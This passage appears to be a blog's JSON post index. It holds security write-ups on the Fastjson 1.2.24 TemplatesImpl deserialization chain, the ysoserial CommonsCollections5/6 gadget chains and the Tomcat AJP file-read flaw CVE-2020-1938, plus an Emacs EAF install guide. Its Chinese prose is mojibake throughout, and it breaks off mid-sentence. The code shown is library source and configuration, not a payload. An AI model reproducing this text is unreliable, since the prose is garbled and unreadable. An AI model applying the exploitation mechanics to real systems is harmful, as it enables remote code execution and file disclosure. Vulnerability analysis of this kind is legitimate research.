å®‰å…¨æœºåˆ¶ï¼Œé»‘åå•ä¸­åªè¦ä¸¤ä¸ªçº¿ç¨‹ç±»ã€‚\nè¯†åˆ«åˆ° @type å…³é”®å­—åï¼Œä¼šä»å€¼ä¸­è¯»å–ç±»åå¹¶è·å– Class å¯¹è±¡ï¼Œç„¶åè°ƒç”¨ ParserConfig#getDeserializer æ–¹æ³•è·å–è§£æå™¨ã€‚\nåœ¨ getDeserializer æ–¹æ³•ä¸­å¯¹ç±»åè¿›è¡Œä¸€äº›æ£€æŸ¥ï¼Œçœ‹çœ‹æ˜¯å¦åœ¨ denyList ä¸­ï¼Œæˆ–è€…æ˜¯ä¸æ˜¯ä¸€äº›ç‰¹æ®Šçš„ç±»ã€‚\nå¦‚æœä¸€ç›´æ‰¾ä¸åˆ°è§£æå™¨ï¼Œå°±ä¼šæ‰§è¡Œ createJavaBeanDeserializer æ–¹æ³•åˆ›å»ºã€‚è·Ÿè¿›åˆ° JavaBeanInfo#build æ–¹æ³•ï¼š\né€šè¿‡åå°„è·å– TemplatesImpl ç±»çš„å…¬å…±å±æ€§ã€æ–¹æ³•å’Œæ„é€ å™¨ï¼Œç„¶åéå†å…¬å…±æ–¹æ³•å°† setter å’Œå¯¹åº”çš„å±æ€§ä¿¡æ¯æ·»åŠ åˆ° fieldList ä¸­ã€‚\nåœ¨æ–¹æ³•æœ€ååˆå¯¹ methods è¿›è¡Œäº†ä¸€æ¬¡éå†ï¼Œè¿™æ¬¡å°†å…³é”®çš„ getOutputProperties æ–¹æ³•æ·»åŠ åˆ° fieldList ä¸­ã€‚\nå¯ä»¥çœ‹åˆ°æ–¹æ³•éœ€è¦æ»¡è¶³ä¸€äº›æ¡ä»¶ï¼Œé¦–å…ˆæ˜¯ if è¯­å¥ä¸­æ¡ä»¶ï¼š\n// 1.æ–¹æ³•åé•¿åº¦å¤§äº4 methodName.length() \u0026gt;= 4 \u0026amp;\u0026amp; // 2.ä¸èƒ½æ˜¯é™æ€æ–¹æ³• !Modifier.isStatic(method.getModifiers()) \u0026amp;\u0026amp; // 3.ä»¥getå¼€å¤´ methodName.startsWith(\u0026quot;get\u0026quot;) \u0026amp;\u0026amp; // 4.ç¬¬å››ä¸ªå­—ç¬¦æ˜¯å¤§å†™ Character.isUpperCase(methodName.charAt(3)) \u0026amp;\u0026amp; // 5.ä¸èƒ½æœ‰å‚æ•° method.getParameterTypes().length == 0 \u0026amp;\u0026amp; // 6.è¿”å›å€¼ç»§æ‰¿äºCollection||Map||AtomicBoolean||AtomicInteger||AtomicLong (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType()) ç„¶åæ˜¯å±æ€§ä¸èƒ½åœ¨ fieldList ä¸­ï¼Œä¹Ÿå°±æ˜¯åˆšåˆšæ·»åŠ  setter æ—¶æ²¡æœ‰è¯¥å±æ€§çš„ setterã€‚\næœ€åè¿”å›è§£æå™¨å¹¶æ‰§è¡Œå®ƒçš„ deserialze æ–¹æ³•ï¼Œè§£æå™¨çš„ sortedFieldDeserializers å±æ€§å°è£…äº† getOutputProperties æ–¹æ³•ã€‚\nä¾æ¬¡å¤„ç†å®Œ bytecodesã€name å’Œ tfactory ä¸‰ä¸ªå±æ€§åå¼€å§‹å¤„ç† outputPropertiesï¼Œæˆ‘ä»¬è·Ÿè¿›åˆ° JavaBeanDeserializer#parseField æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è·å–å±æ€§çš„è§£æå™¨å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚\nä»ä¸Šå›¾çœ‹åˆ°é€šè¿‡ smartMatch æ–¹æ³•è·å– outputProperties å±æ€§çš„è§£æå™¨ï¼Œä½†æ˜¯å‚æ•°å‰é¢æ˜¯å¸¦æœ‰ä¸‹åˆ’çº¿çš„(ä¹‹å‰ä¸‰ä¸ªå±æ€§ä¹Ÿæ˜¯)ã€‚ä¸è¿‡ smartMatch æ–¹æ³•ä¼šå°†å‚æ•°ä¸­çš„ - å’Œ _ å¿½ç•¥ï¼š\nç„¶åè·Ÿè¿›åˆ° FieldDeserializer#setValue æ–¹æ³•ï¼Œåœ¨ä¸ºå‚æ•°(outputProperties)èµ‹å€¼æ—¶ä» fieldInfo è·å–å¯¹åº”çš„ method å¹¶è°ƒç”¨ invoke æ–¹æ³•æ‰§è¡Œã€‚\nå°±è¿™æ · Fastjson çš„ååºåˆ—åŒ–è¿‡ç¨‹å’Œ TemplatesImpl çš„åˆ©ç”¨é“¾æˆåŠŸé€‚é…ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚\næˆ‘ä»¬å†å›è¿‡å¤´çœ‹çœ‹ bytecodes å‚æ•°çš„è§£æè¿‡ç¨‹ï¼ŒFastjson æ ¹æ®å±æ€§çš„ç±»å‹(å­—èŠ‚æ•°ç»„)è·å–å¯¹åº”çš„è§£æå™¨ ObjectArrayCodecï¼Œè¯»å–å…¶å†…å®¹æ—¶è°ƒç”¨ JSONScanner#bytesValue æ–¹æ³•è¿›è¡Œ base64 è§£ç ï¼š\npublic byte[] bytesValue() { return IOUtils.decodeBase64(this.text, this.np + 1, this.sp); } æ‰€ä»¥ poc ä¸­ bytecodes çš„å€¼è¦è¿›è¡Œç¼–ç å¤„ç†ã€‚\næ€»ç»“ Fastjson 1.2.24 ä¸­ autotype æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œè€Œä¸”æ²¡æœ‰ checkAutotype æ–¹æ³•ï¼Œæ‰€ä»¥æ”»å‡»éš¾åº¦ç›¸å¯¹è¾ƒä½ï¼Œåœ¨ 1.2.25 ååŸºæœ¬æ˜¯é’ˆå¯¹ checkAutotype çš„å„ç§ç»•è¿‡äº†ã€‚ä½† TemplatesImpl åˆ©ç”¨é“¾ä¸­éœ€è¦è®¾ç½®ä¸€äº›ç§æœ‰å±æ€§ï¼Œéœ€è¦ Fastjson å¼€å¯ SupportNonPublicField é€‰é¡¹ï¼Œè€Œè¿™ä¸ªé€‰é¡¹æ˜¯åœ¨ 1.2.22 ç‰ˆæœ¬å¼•å…¥çš„ã€‚\nFastjson è¿˜æä¾›äº†å‡ ä¸ª parseObject æ–¹æ³•æ¥è§£æ JSON å­—ç¬¦ä¸²ï¼Œä¸è¿‡æœ€åå’Œæœ¬æ–‡çš„ç¤ºä¾‹ä¸€æ ·éƒ½ä¼šæ‰§è¡Œåˆ° DefaultJSONParser#parseï¼Œä¸å½±å“ TemplatesImpl åˆ©ç”¨é“¾ã€‚\nFastjson è§£æ JSON å­—ç¬¦ä¸²æ—¶ï¼Œä¼šè°ƒç”¨ååºåˆ—åŒ–å¯¹è±¡çš„å…¬å…± setter å’Œæ„é€ å‡½æ•°ï¼Œè¿˜æœ‰ç¬¦åˆä¸€å®šæ¡ä»¶çš„ getterï¼ŒTemplatesImpl åˆ©ç”¨é“¾å°±æ˜¯ç”¨åˆ°äº† getter æ–¹æ³•ä¸­çš„æ¼æ´ã€‚\n","date":"2021-04-12","permalink":"https://zrquan.github.io/posts/fastjson/","tags":["fastjson","java"],"title":"Fastjson 1.2.24 TemplatesImplåˆ©ç”¨é“¾"},{"content":"What EAF æ˜¯ ManateeLazyCat å¼€å‘çš„ Emacs å›¾å½¢åº”ç”¨æ¡†æ¶ï¼Œé€šè¿‡ PyQt æ¡†æ¶æ¥å¼€å‘å›¾å½¢åº”ç”¨å¹¶å°†å…¶å›ºå®šåœ¨ Emacs çª—å£çš„åˆé€‚ä½ç½®ï¼ŒEmacs å’Œ Python è¿›ç¨‹åˆ™é€šè¿‡ IPC è¿›è¡Œé€šä¿¡ï¼Œè¾¾åˆ°åƒæ“ä½œ Emacs åŸç”Ÿ buffer å’Œ window ä¸€æ ·æ“ä½œå›¾å½¢åº”ç”¨çš„æ•ˆæœã€‚\nEAF ä½¿ç”¨ QGraphicsScene å’Œ QGraphicsView æ¥æ¨¡æ‹Ÿ Emacs ä¸­çš„ buffer å’Œ windowï¼Œ QGraphicsScene ç®¡ç†åº”ç”¨çš„å†…å®¹ã€å¤„ç†é”®é¼ äº‹ä»¶ï¼Œç”Ÿå‘½å‘¨æœŸå’Œ buffer ç›¸åŒï¼›QGraphicsView å±•ç¤ºå›¾å½¢ç•Œé¢ã€ç›‘å¬é¼ æ ‡äº‹ä»¶ï¼Œç”Ÿå‘½å‘¨æœŸå’Œ window ç›¸åŒï¼Œå†é€šè¿‡ QWindow::setParent æŠ€æœ¯å°†å®ƒå›ºå®šåœ¨ Emacs ä¸Šã€‚è€Œé”®ç›˜äº‹ä»¶åˆ™ç”± Emacs æ¥æ”¶ï¼Œé€šè¿‡ EPC å‘é€ç»™ QGraphicsSceneã€‚1\nHomepage: https://github.com/manateelazycat/emacs-application-framework\nWhy ä¸è®°å¾—ä¹‹å‰åœ¨å“ªé‡Œçœ‹åˆ°ä¸€å¥è¯â€”â€”Emacs æœ€å¤§çš„ç¼ºç‚¹å°±æ˜¯ä½ ä¸å¾—ä¸ç¦»å¼€ Emacsã€‚\nä¹‹å‰å†™æ–‡ç« åšç¬”è®°æ—¶ï¼Œéƒ½è¦ä¸€ä¸ªåŠå±æ‰“å¼€æµè§ˆå™¨æˆ–è€… PDFï¼Œä¸€ä¸ªåŠå±æ”¾ Emacsã€‚ç°åœ¨å¯ä»¥ç›´æ¥åœ¨ Emacs æ‰“å¼€æµè§ˆå™¨ï¼Œç”¨æ¥é¢„è§ˆæœ¬åœ°åšå®¢çœŸçš„å¾ˆçˆ½ã€‚\nå½“ç„¶ï¼ŒEAF çš„åº”ç”¨æ¯”èµ·é‚£äº›æˆç†Ÿçš„è½¯ä»¶è¿˜æ˜¯æœ‰å¾ˆå¤§å·®è·çš„ï¼ŒåŠŸèƒ½ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä¸å¿…éè¦ç”¨å®ƒæ¥å–ä»£å…¶ä»–è½¯ä»¶ã€‚æˆ‘ä¸ªäººå¯¹ Live in Emacs æ˜¯æ²¡å•¥æ‰§å¿µçš„ï¼Œå“ªä¸ªç”¨ç€çˆ½å°±ç”¨å“ªä¸ªğŸ˜\nHow EAF çš„å®‰è£…å¾ˆç®€å•(åªè¦ä¸é‡åˆ°å¥‡å¥‡æ€ªæ€ªçš„ bug)ï¼Œgithub ä¸»é¡µç»™äº†è¯¦ç»†çš„è¿‡ç¨‹ï¼Œä¸‹é¢æˆ‘å†™ä¸€ä¸‹æˆ‘åœ¨ Windows10 \u0026amp; Spacemacs ç¯å¢ƒä¸‹çš„å®‰è£…è¿‡ç¨‹ã€‚\nâ‘  ä¸‹è½½ EAF\ngit clone --depth=1 -b master https://github.com/manateelazycat/emacs-application-framework.git ~/.emacs.d/private/local/emacs-application-framework/ â‘¡ å®‰è£… python ä¾èµ–\ncd ~/.emacs.d/private/local/emacs-application-framework/ node install-eaf-win32.js å¦‚æœå®‰è£…æœ‰é—®é¢˜å…ˆæ£€æŸ¥ä¸€ä¸‹ pip èƒ½ä¸èƒ½è®¿é—®åˆ°æœåŠ¡å™¨ï¼Œè¿æ¥è¶…æ—¶çš„è¯ä¸€èˆ¬æ˜¯ä»£ç†çš„é”…ã€‚\nè„šæœ¬æœ€åä¼šä¸‹è½½ä¸€ä¸ªè§†é¢‘è§£ç å™¨ K-Lite Codec Packï¼Œå¦‚æœä¸æ‰“ç®—ç”¨ Emacs çœ‹è§†é¢‘å°±å¯ä»¥ Ctrl-C äº†ã€‚\nâ‘¢ å®‰è£… Elisp ä¾èµ–\nä¸‹è½½å®‰è£… emacs-ctableã€emacs-deferredã€emacs-epcï¼Œä¸è¿‡æ–°ç‰ˆ Emacs å¥½åƒä½œä¸ºä¾èµ–å®‰è£…å¥½äº†ï¼Œåæ­£æˆ‘æ˜¯è·³è¿‡äº†è¿™ä¸€æ­¥ã€‚\nâ‘£ æ·»åŠ é…ç½®\n(add-to-list 'load-path \u0026quot;~/.emacs.d/private/local/emacs-application-framework/\u0026quot;) (require 'eaf) æˆ‘çš„é…ç½®ï¼Œä»¥åèƒ½æƒ³èµ·æ¥å°±æ›´æ–°ä¸€ä¸‹ã€‚ ;; EAF (use-package eaf :load-path \u0026quot;~/.emacs.d/private/local/emacs-application-framework\u0026quot; ; Set to \u0026quot;/usr/share/emacs/site-lisp/eaf\u0026quot; if installed from AUR :init (use-package epc :defer t :ensure t) (use-package ctable :defer t :ensure t) (use-package deferred :defer t :ensure t) (use-package s :defer t :ensure t) :custom (eaf-browser-continue-where-left-off t) :config (setq eaf-fullscreen-p t) (eaf-setq eaf-browser-enable-adblocker \u0026quot;true\u0026quot;) (eaf-setq eaf-browser-dark-mode \u0026quot;false\u0026quot;) (setq browse-url-browser-function 'eaf-open-browser) (defalias 'browse-web #'eaf-open-browser) (eaf-bind-key nil \u0026quot;M-q\u0026quot; eaf-browser-keybinding)) ;; unbind, see more in the Wiki ;; eaf-evil (require 'eaf-evil) (setq eaf-evil-leader-keymap spacemacs-cmds) (define-key key-translation-map (kbd \u0026quot;SPC\u0026quot;) (lambda (prompt) (if (derived-mode-p 'eaf-mode) (pcase eaf--buffer-app-name (\u0026quot;browser\u0026quot; (if (string= (eaf-call-sync \u0026quot;call_function\u0026quot; eaf--buffer-id \u0026quot;is_focus\u0026quot;) \u0026quot;True\u0026quot;) (kbd \u0026quot;SPC\u0026quot;) (kbd eaf-evil-leader-key))) (\u0026quot;pdf-viewer\u0026quot; (kbd eaf-evil-leader-key)) (\u0026quot;image-viewer\u0026quot; (kbd eaf-evil-leader-key)) (_ (kbd \u0026quot;SPC\u0026quot;))) (kbd \u0026quot;SPC\u0026quot;)))) ;; eaf-org (require 'eaf-org) (defun eaf-org-open-file (file \u0026amp;optional link) \u0026quot;An wrapper function on `eaf-open'.\u0026quot; (eaf-open file)) ;; use `emacs-application-framework' to open PDF file: link (add-to-list 'org-file-apps '(\u0026quot;\\\\.pdf\\\\'\u0026quot; . eaf-org-open-file)) https://github.com/manateelazycat/emacs-application-framework/wiki/Hacking\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-04-02","permalink":"https://zrquan.github.io/posts/eaf/","tags":["emacs"],"title":"Emacs Application Framework"},{"content":"åœ¨ä¹‹å‰ CommonsCollections1 çš„æ–‡ç« ä¸­æœ‰åˆ†ææ€ä¹ˆåˆ©ç”¨å‡ ä¸ª Transformer ç±»æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä»¥åŠé€šè¿‡ LazyMap#get æ¥è§¦å‘ã€‚æ‰€ä»¥æœ¬æ–‡ä¸å†èµ˜è¿°è¿™ä¸€éƒ¨åˆ†å†…å®¹ï¼Œåªè¦çŸ¥é“æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œ LazyMap#get æ–¹æ³•å°±è¡Œäº†ã€‚\nCommonsCollections5 è¿™æ¡é“¾éœ€è¦ç”¨åˆ° BadAttributeValueExpException ä¸­é‡å†™çš„ readObject æ–¹æ³•ï¼Œæˆ‘æœäº†ä¸€ä¸‹æ²¡æ‰¾åˆ°è¿™ä¸ªæ–¹æ³•å…·ä½“æ˜¯åœ¨å“ªä¸ªç‰ˆæœ¬åŠ ä¸Šå»çš„ï¼Œä¸‹é¢æµ‹è¯•ç”¨çš„æ˜¯ JDK 8u212 ã€‚\né¦–å…ˆçœ‹ä¸€ä¸‹ getObject æ–¹æ³•ï¼š\nå‰é¢æ„é€  transformerChain çš„è¿‡ç¨‹å’Œ cc1 ä¸€æ ·ï¼Œè§¦å‘ç‚¹åŒæ ·åœ¨ lazyMap#get æ–¹æ³•ä¸­ã€‚åŒºåˆ«ä¸»è¦åœ¨çº¢æ¡†çš„éƒ¨åˆ†â€”â€”ç”Ÿæˆ TiedMapEntry å¯¹è±¡ï¼Œå¹¶å°† lazyMap èµ‹å€¼ç»™å®ƒçš„ map å±æ€§ï¼›ç„¶ååˆ›å»º BadAttributeValueExpException å¯¹è±¡ï¼Œé€šè¿‡åå°„å°† TiedMapEntry å¯¹è±¡èµ‹å€¼ç»™å®ƒçš„ç§æœ‰å±æ€§ valã€‚\nåœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œæ‰§è¡Œ BadAttributeValueExpException é‡å†™çš„ readObject æ–¹æ³•ï¼š\nå¦‚æœæ²¡æœ‰å¼€å¯å®‰å…¨ç®¡ç†å™¨(System.getSecurityManager() == null)ï¼Œä¼šæ‰§è¡Œ TiedMapEntry#toString æ–¹æ³•ã€‚TiedMapEntry çš„å…³é”®æ–¹æ³•å¦‚ä¸‹ï¼š\npublic Object getValue() { return this.map.get(this.key); } ... public String toString() { return this.getKey() + \u0026quot;=\u0026quot; + this.getValue(); } å¯è§æœ€ç»ˆä¼šæ‰§è¡Œæˆ‘ä»¬æ„é€ çš„ lazyMap çš„ get æ–¹æ³•ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚\nCommonsCollections6 å‰åŠæ®µå’Œä¸Šé¢ä¸€æ ·ï¼Œå…ˆæ„é€ ä¸€ä¸ª TiedMapEntry ç±»å¯¹è±¡ï¼Œæƒ³åŠæ³•è§¦å‘å®ƒçš„ getValue æˆ–è€… toString æ–¹æ³•ã€‚\né¦–å…ˆåˆ›å»ºä¸€ä¸ª HashSet ç±»å¯¹è±¡ï¼Œé€šè¿‡åå°„æ‹¿åˆ°å®ƒçš„ç§æœ‰å±æ€§ mapï¼š\nè¿™ä¸ª map å±æ€§æ˜¯ HashMap ç±»çš„ï¼Œå†é€šè¿‡åå°„è·å–å…¶ table å±æ€§ï¼š\nè·å–æ•°ç»„çš„ç¬¬ä¸€ä¸ªéç©ºå…ƒç´  nodeï¼Œå°†æ„é€ å¥½çš„ TiedMapEntry å¯¹è±¡èµ‹å€¼ç»™å®ƒçš„ key å±æ€§ï¼š\næ„é€ å¥½çš„ HashSet å¯¹è±¡ç»“æ„å¦‚ä¸‹ï¼š\nä»ä¸Šå›¾å¯ä»¥çœ‹åˆ° map å’Œ table ä¸¤ä¸ªéƒ½æ˜¯ transient å±æ€§ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œé‚£è®¾ç½®å®ƒä»¬æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿæˆ‘ä»¬çœ‹ä¸€ä¸‹ HashSet#writeObject æ–¹æ³•ï¼š\nprivate void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { // Write out any hidden serialization magic s.defaultWriteObject(); // Write out HashMap capacity and load factor s.writeInt(map.capacity()); s.writeFloat(map.loadFactor()); // Write out size s.writeInt(map.size()); // Write out all elements in the proper order. for (E e : map.keySet()) s.writeObject(e); } å…³é”®åœ¨æœ€åçš„ for å¾ªç¯ï¼Œä¸»åŠ¨å°†æˆ‘ä»¬æ„é€ çš„ TiedMapEntry å¯¹è±¡å†™åˆ°è¾“å‡ºæµä¸­ï¼Œæ‰€ä»¥ä¸å— transient çš„å½±å“ã€‚\nååºåˆ—åŒ– HashSet æ—¶ï¼Œåœ¨ readObjet æ–¹æ³•çš„æœ€åä¼šè·å– TiedMapEntry å¯¹è±¡(key)ï¼Œå°†å®ƒæ·»åŠ åˆ°ä¸€ä¸ª HashMap ä¸­ã€‚\nè·Ÿè¿›å‘ç°ä¼šé€šè¿‡ key.hashCode() è·å– key çš„å“ˆå¸Œå€¼ï¼Œè€Œåœ¨ TiedMapEntry#hashCode æ–¹æ³•ä¸­è§¦å‘äº† lazyMap#get æ–¹æ³•ï¼š\næœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚\næ€»ç»“ ä¹‹æ‰€ä»¥æŠŠ cc5 å’Œ cc6 ä¸¤æ¡é“¾æ”¾åœ¨ä¸€èµ·è®²ï¼Œæ˜¯å› ä¸ºå®ƒä»¬å’Œ cc1 ä¸€æ ·éƒ½åˆ©ç”¨ ChainedTransformer æ„é€ åå°„é“¾æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”éƒ½åˆ©ç”¨äº† TiedMapEntry ç±»ã€‚\né“¾çš„å‰åŠéƒ¨åˆ†é€»è¾‘å°±æ¯”è¾ƒç®€å•äº†ï¼Œæ¯”è¾ƒæœ‰è¶£çš„çŸ¥è¯†ç‚¹æ˜¯ HashSet çš„ writeObject æ–¹æ³•ä¼šåºåˆ—åŒ–å®ƒçš„æ‰€æœ‰ keyï¼Œè€Œ HashMap çš„ writeObject ä¼šåºåˆ—åŒ–å®ƒçš„æ‰€æœ‰ key å’Œ valueï¼Œæ‰€ä»¥å³ä½¿å±æ€§ç”¨ transient ä¿®é¥°ä¹Ÿä¸å½±å“åˆ©ç”¨ã€‚\n","date":"2021-04-01","permalink":"https://zrquan.github.io/posts/ysoserial-cc56/","tags":["java","deserialize"],"title":"Ysoserial-CommonsCollections5/6"},{"content":"ç¼–å·ï¼šCNVD-2020-10487/CVE-2020-1938\næè¿°ï¼šç”±äº Tomact AJP åè®®çš„è®¾è®¡ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¼æ´è¯»å– webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œæˆ–è€…é€šè¿‡æ–‡ä»¶åŒ…å« getshellã€‚\nå½±å“ç‰ˆæœ¬ï¼šTomcat 9/8/7/6\nTomcat Connector Connector æ˜¯ Tomcat ç”¨æ¥å¤„ç†å¤–éƒ¨è¿æ¥çš„æ ¸å¿ƒç»„ä»¶ï¼Œå®ƒå°†åº•å±‚çš„ socket ä¿¡é“å°è£…æˆ Request å’Œ Response ä¸¤ä¸ªå¯¹è±¡ï¼Œå†äº¤ç»™ Container(servlet å®¹å™¨)è¿›è¡Œå¤„ç†ã€‚\nConnector çš„æºç åœ¨ org.apache.coyote ç›®å½•ä¸‹ï¼Œé»˜è®¤æœ‰ä¸¤ä¸ªâ€”â€”åˆ†åˆ«å¤„ç† HTTP åè®®å’Œ AJP åè®®ã€‚\nApache Jserv Protocol AJP åè®®å¯ä»¥ç®€å•ç†è§£ä¸º HTTP åè®®çš„äºŒè¿›åˆ¶æ€§èƒ½ä¼˜åŒ–ç‰ˆæœ¬ï¼Œå®ƒèƒ½é™ä½ HTTP è¯·æ±‚çš„å¤„ç†æˆæœ¬ï¼Œå› æ­¤ä¸»è¦åœ¨éœ€è¦é›†ç¾¤ã€åå‘ä»£ç†çš„åœºæ™¯è¢«ä½¿ç”¨ï¼Œé»˜è®¤å¼€æ”¾åœ¨ 8009 ç«¯å£ã€‚\næµè§ˆå™¨æ— æ³•ç›´æ¥å¤„ç† AJP åè®®ï¼Œæ‰€ä»¥é€šå¸¸ç”¨äº Tomcat å’Œå…¶ä»– web æœåŠ¡å™¨çš„é€šä¿¡ï¼Œæ¯”å¦‚ Apache çš„ proxy_ajp æ¨¡å—å°±å¯ä»¥ä»£ç† AJP åè®®ã€‚\nPOC éƒ¨ç½²å¥½ç¯å¢ƒåï¼Œåœ¨ github æ‰¾ä¸ªè„šæœ¬å¤ç°ä¸€ä¸‹æ¼æ´ã€‚\nå¯è§é€šè¿‡ AJP åè®®è¯·æ±‚ /asdf è·¯å¾„ï¼Œå´è¯»å–äº† web.xml æ–‡ä»¶çš„å†…å®¹ã€‚\nç”¨ wireshark çœ‹ä¸€ä¸‹ AJP è¯·æ±‚çš„å†…å®¹ï¼š\nçº¢æ¡†ä¸­çš„ä¸‰ä¸ªç”±ç”¨æˆ·æ§åˆ¶çš„å‚æ•°å°±æ˜¯å¯¼è‡´æ–‡ä»¶è¯»å–çš„ç½ªé­ç¥¸é¦–ï¼Œä¸‹é¢é€šè¿‡è°ƒè¯• Tomcat çœ‹çœ‹æ€ä¹ˆå¤„ç†å®ƒä»¬çš„ã€‚\næ–‡ä»¶è¯»å– å¤„ç†è¯·æ±‚çš„ç±»æ˜¯ org.apache.coyote.ajp.AbstractAjpProcessor ï¼Œè¿›å…¥ prepareRequest æ–¹æ³•ï¼Œè¿™é‡Œæ˜¯æ¼æ´çš„å…¥å£ç‚¹ï¼Œæ­¤æ—¶çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\næ¥åˆ°å…³é”®çš„ while è¯­å¥ï¼Œåœ¨è¿™é‡Œå¯¹ä¸Šé¢æåˆ°çš„ä¸‰ä¸ªå‚æ•°è¿›è¡Œè®¾ç½®ï¼š\nrequest.setAttribute() å°±æ˜¯ç®€å•çš„ HashMap èµ‹å€¼æ“ä½œï¼Œå¾ªç¯ç»“æŸå attributes å±æ€§å¦‚ä¸‹ï¼š\nAJP Connector å°è£…å¥½ request å¯¹è±¡åï¼Œä¼šå°†å…¶ä¼ ç»™ Container å¤„ç†ã€‚\nContainer å³ servlet å®¹å™¨ï¼Œç›¸å…³è®¾ç½®å¯ä»¥åœ¨ web.xml æ–‡ä»¶æ‰¾åˆ°ï¼Œä¸‹é¢æ˜¯é»˜è®¤å¼€å¯çš„ä¸¤ä¸ª servlet å®¹å™¨ï¼š\n\u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt; ... \u0026lt;/servlet\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;jsp\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.jasper.servlet.JspServlet\u0026lt;/servlet-class\u0026gt; ... \u0026lt;/servlet\u0026gt; \u0026lt;!-- The mapping for the default servlet --\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;!-- The mappings for the JSP servlet --\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;jsp\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.jsp\u0026lt;/url-pattern\u0026gt; \u0026lt;url-pattern\u0026gt;*.jspx\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; å½“è¯·æ±‚ç›®æ ‡çš„åç¼€æ˜¯ jsp æˆ–è€… jspx æ—¶ç”± JspServlet å¤„ç†è¯·æ±‚ï¼Œå…¶ä»–æƒ…å†µåˆ™ç”± DefaultServlet å¤„ç†ã€‚å› æ­¤ä¸ºäº†ç¡®ä¿ç”± DefaultServlet å¤„ç†æˆ‘ä»¬çš„è¯·æ±‚ï¼Œè€Œä½¿ç”¨ /asdf è¿™ç§å¤§æ¦‚ç‡ä¸å­˜åœ¨çš„è·¯å¾„ã€‚\nä»£ç æ‰§è¡Œåˆ° DefaultServlet#doGet æ–¹æ³•ä¸­ï¼š\nä¸€ç›´è·Ÿè¿›åˆ° getRelativePath æ–¹æ³•ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š\nä¸Šå›¾çš„ç¬¬ä¸€ä¸ª if è¯­å¥æ‹¼æ¥äº† path_info å’Œ servlet_path å‚æ•°å¾—åˆ° /WEB-INF/web.xml ï¼Œè€Œè¿›å…¥ if çš„æ¡ä»¶æ˜¯ request_uri ä¸ä¸ºç©º(ä¸ä¸€å®šè¦æ˜¯ /)ï¼Œè¿™å°±æ˜¯ poc è®¾ç½®è¯¥å‚æ•°çš„åŸå› ã€‚\nè·å–è·¯å¾„åè°ƒç”¨ getResource æ–¹æ³•è¯»å–æ–‡ä»¶ï¼š\nçº¢æ¡†ä¸­çš„ validate æ–¹æ³•ç”¨æ¥æ£€æŸ¥æ–‡ä»¶çš„è·¯å¾„ï¼Œç¡®ä¿è·¯å¾„ä»¥ / å¼€å¤´ï¼Œä¸”ä¸ä¼šè·¨è¶Šåˆ° webapp ç›®å½•ä»¥å¤–ã€‚ä»£ç å¦‚ä¸‹ï¼š\nä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ä»£ç ä¼šæ ¡éªŒè·¯å¾„æ˜¯å¦ä»¥ / å¼€å¤´ï¼Œä¸”æ ‡å‡†åŒ–äº†è·¯å¾„åˆ†éš”ç¬¦ï¼Œä½†æ˜¯æ€ä¹ˆé˜²æ­¢ç›®å½•ç©¿è¶Šå‘¢ï¼Ÿåœ¨å¤„ç†è·¯å¾„åˆ†éš”ç¬¦çš„éƒ¨åˆ†è°ƒç”¨äº† RequestUtil#normalize æ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ï¼š\næ–¹æ³•å¼€å¤´ä¼šæ›¿æ¢ windows ç³»ç»Ÿçš„ \\\\ ï¼Œç„¶åæ ¹æ®æƒ…å†µåœ¨å¼€å¤´å’Œæœ«å°¾åŠ ä¸Š / ï¼Œåœ¨åé¢æ‰§è¡Œä»¥ä¸‹ while è¯­å¥ï¼š\nwhile (true) { int index = normalized.indexOf(\u0026quot;/../\u0026quot;); if (index \u0026lt; 0) { break; } if (index == 0) { return null; // Trying to go outside our context } int index2 = normalized.lastIndexOf('/', index - 1); normalized = normalized.substring(0, index2) + normalized.substring(index + 3); } ä¸Šè¿°ä»£ç ä¼šå°† /../ å’Œå‰ä¸€ä¸ªç›®å½•åæŠµæ¶ˆï¼Œå¦‚æœæœ€å /../ å‡ºç°åœ¨å¼€å¤´ï¼Œå³å°è¯•é€ƒå‡º webapp ç›®å½•ï¼Œå°±ä¼šè¿”å› nullã€‚ç†è§£è¿™æ®µä»£ç çš„å…³é”®åœ¨äºç†è§£ lastIndexOf 